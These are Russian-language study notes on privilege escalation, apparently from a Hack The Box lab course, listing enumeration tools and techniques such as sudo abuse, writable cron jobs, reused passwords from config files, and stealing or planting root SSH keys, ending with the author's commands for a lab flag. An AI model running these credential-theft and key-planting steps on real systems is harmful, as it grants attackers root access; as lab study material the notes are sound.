Контрольные списки PrivEsc

Ресурсы:
HackTricks (Linux)
https://book.hacktricks.wiki/en/index.html
PayloadsAllTheThings (windows)
https://github.com/swisskyrepo/PayloadsAllTheThings

Скрипт для автоперечисления сервера
Linux:
https://github.com/rebootuser/LinEnum
https://github.com/sleventyeleven/linuxprivchecker

Windows:
https://github.com/GhostPack/Seatbelt
https://github.com/411Hall/JAWS

Универсальный:
https://github.com/peass-ng/PEASS-ng




Эксплойты ядра

Если система по каким-то причинам не обновляется и имеет старые версии ядра, 
к ним можно найти эксплойты и применить их для получения доступа к системе

Уязвимое ПО

Узнать версии ПО установленные на хосте
dpkg -l

узнать привилегии пользователя
sudo -l 

выполнить команду от имени пользователя не требующую пароля (/bin/echo sript)

как только находишт приложение которое можем запустить от пользователя с sudo можно 
поискать способы его использования для получения доступа к оболочке от root

GTFOBins (содержит список команд и способов их использования sudo)
https://gtfobins.org/

LOLBAS (Windows)
https://lolbas-project.github.io/#







Запланированные задачи
`cron` Cron Jobs
Существуют определенные каталоги, которые можно использовать для добавления новых 
заданий cron, если у есть соответствующие write права доступа. К ним относятся:

/etc/crontab
/etc/cron.d
/var/spool/cron/crontabs/root

Если мы можем записывать данные в каталог, вызываемый заданием cron, мы можем написать bash-скрипт с командой обратной оболочки, которая при выполнении должна отправлять нам обратную оболочку








Уязвимые учетные данные

поискать файлы, которые можем прочитать, и проверить, содержат ли они какие-либо скрытые учетные данные
Для этого удобно использовать скрипты перечисления (ссылки выше)

Пример:
...SNIP...
[+] Searching passwords in config PHP files
[+] Finding passwords inside logs (limit 70)
...SNIP...
/var/www/html/config.php: $conn = new mysqli(localhost, 'db_user', 'password123');

Можно попробовать использовать тот же пароль пользователя для переключения на рута:
SavitskiyES@htb[/htb]$ su -

Password: password123
whoami

root







SSH-ключи
Если у нас есть доступ на чтение к .sshкаталогу для конкретного пользователя, 
мы можем прочитать его закрытые SSH-ключи, найденные в /home/user/.ssh/id_rsaили /root/.ssh/id_rsa
Если мы можем прочитать каталог /root/.ssh/и можем прочитать id_rsaфайл , 
мы можем скопировать его на нашу машину и использовать -iфлаг для входа с его помощью

SavitskiyES@htb[/htb]$ vim id_rsa
SavitskiyES@htb[/htb]$ chmod 600 id_rsa
SavitskiyES@htb[/htb]$ ssh root@10.10.10.10 -i id_rsa

root@10.10.10.10#


Если у нас есть права на запись в /.ssh/каталог пользователя, мы можем поместить 
наш открытый ключ в каталог ssh этого пользователя по адресу /home/user/.ssh/authorized_keys
Сначала необходимо создать новый ключ с ssh-keygen флагом -f для указания выходного файла:

SavitskiyES@htb[/htb]$ ssh-keygen -f key

Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): *******
Enter same passphrase again: *******

Your identification has been saved in key
Your public key has been saved in key.pub
The key fingerprint is:
SHA256:...SNIP... user@parrot
The key's randomart image is:
+---[RSA 3072]----+
|   ..o.++.+      |
...SNIP...
|     . ..oo+.    |
+----[SHA256]-----+

В результате у нас получится два файла: key(который мы будем использовать с ssh -i) и key.pub, которые мы скопируем на удалённый компьютер. Скопируем key.pub, а затем на удалённом компьютере добавим его в /root/.ssh/authorized_keys:

Повышение привилегий:
user@remotehost$ echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys

Теперь удалённый сервер должен позволить нам войти в систему под этим пользователем, используя наш закрытый ключ:
Повышение привилегий

SavitskiyES@htb[/htb]$ ssh root@10.10.10.10 -i key

root@remotehost# 







Команды для получения флага:
ssh user1@83.136.249.34 -p 32202
sudo -l
sudo user2 -i
cat /root/.ssh/id_rsa (либо вариант если рута не можем прочитать то /home/user/.ssh/id_rsa)

прочитали ключ root
Создали текстовый файл на своем хосте и вставили туда ключ который узнали
nano stolen_id_rsa
chmod 600 stolen_id_rsa (ограничили права ибо как помним если не ограничим откажется читать ключ)
ssh -i stolen_id_rsa root@83.136.249.34 -p 32202 (зашли от рута)

